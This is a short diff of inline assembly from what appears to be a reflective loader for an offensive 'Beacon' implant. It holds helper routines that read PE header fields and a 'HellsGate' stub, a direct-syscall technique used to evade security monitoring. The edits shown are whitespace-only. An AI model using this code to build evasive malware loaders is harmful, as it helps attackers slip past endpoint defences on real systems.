-    "ret \n" 
+    "ret \n"
 "getNumberOfSections: \n"
     "add rcx, 0x6 \n"           // &FileHeader.NumberOfSections
     "xor rax, rax \n"
     "mov ax, [rcx] \n"
-    "ret \n" 
+    "ret \n"
 "getBeaconEntryPoint: \n"
     "add rdx, 0x10 \n"          // OptionalHeader.AddressOfEntryPoint
     "mov eax, [rdx] \n"
@@ -814,7 +810,7 @@ __asm__(
     "xor rax,rax \n"
     "mov ax, [rcx+4] \n"
     "ret \n"
-    "HellsGate: \n"
+"HellsGate: \n"
     "xor r11, r11 \n"
     "mov r11d, ecx \n"
     "ret \n"
